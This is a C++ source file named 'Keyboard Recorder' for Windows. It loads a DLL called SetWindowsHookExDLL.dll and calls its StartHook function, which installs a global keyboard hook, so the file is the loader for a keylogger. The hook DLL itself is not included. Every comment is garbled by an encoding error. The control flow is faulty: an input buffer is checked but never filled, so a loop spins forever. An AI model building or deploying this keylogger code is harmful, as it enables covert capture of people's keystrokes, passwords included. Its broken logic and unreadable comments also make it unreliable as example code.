// Keyboard Recorder.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<windows.h>
#include<iostream>
using namespace std;





typedef BOOL(*Func)();//����ָ��


int main()
{
	/*while (true)
	{
		cout << GetAsyncKeyState(VK_SPACE) << endl; //GetAsyncKeyState��������ѱ���������λ0��Ϊ1��������Ϊ0��

	}*/
	//�����Ҫʵ��ȫ��HOOK��ֻ�ж�̬���ӿ����ʵ��


	
	DWORD dwError = NOERROR;
	BOOL bRet = FALSE;
	HINSTANCE hDll = nullptr;
	do
	{
		hDll = LoadLibraryW(L"SetWindowsHookExDLL.dll");//���ض�̬���ӿ�
		if (!hDll)//������Ի�ȡ������
		{
			dwError = GetLastError();
			break;
		}
		Func fun=(Func)GetProcAddress(hDll, "StartHook");//ͨ��API��ȡ������λ��//ͬ�����TYPEDEF
		if (!fun)//�ж�ָ�벻Ϊ��
		{
			dwError = GetLastError();
			break;
		}
		if (!fun())//����FUN
		{
			break;
		}
		while (true)
		{
			char szInput[MAXBYTE] = { 0 };
			if (0 == strcmp(szInput, "yes"))
			{
				break;

			}
		}
		bRet = TRUE;
	} while (true);


	if (FALSE == bRet)
	{
		cout << "���ִ���" << dwError << endl;
	}
	
	
	

	if (hDll)
	{
		FreeLibrary(hDll);
	}

	getchar();

    return 0;
}

